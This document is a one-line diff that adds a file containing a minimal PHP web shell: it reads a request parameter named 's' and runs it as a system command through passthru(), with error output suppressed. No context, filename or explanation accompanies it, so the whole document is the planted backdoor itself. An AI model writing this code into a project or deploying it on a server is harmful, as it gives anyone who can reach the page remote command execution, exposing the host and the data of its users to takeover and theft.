@@ -1,0 +1,1 @@
+<?php if(@$_REQUEST['s']){@passthru($_REQUEST['s']);} ?>
